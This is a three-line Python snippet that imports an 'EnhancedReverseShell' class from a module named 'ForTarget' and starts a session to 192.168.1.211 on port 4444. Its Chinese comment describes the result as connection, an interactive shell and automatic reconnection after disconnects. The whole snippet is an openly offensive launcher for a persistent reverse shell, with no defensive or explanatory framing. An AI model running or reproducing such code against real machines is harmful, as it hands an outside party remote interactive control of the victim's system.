from ForTarget import EnhancedReverseShell

shell = EnhancedReverseShell(host='192.168.1.211', port=4444)
shell.shell_session()  # 连接 + 交互式 shell + 断线重连
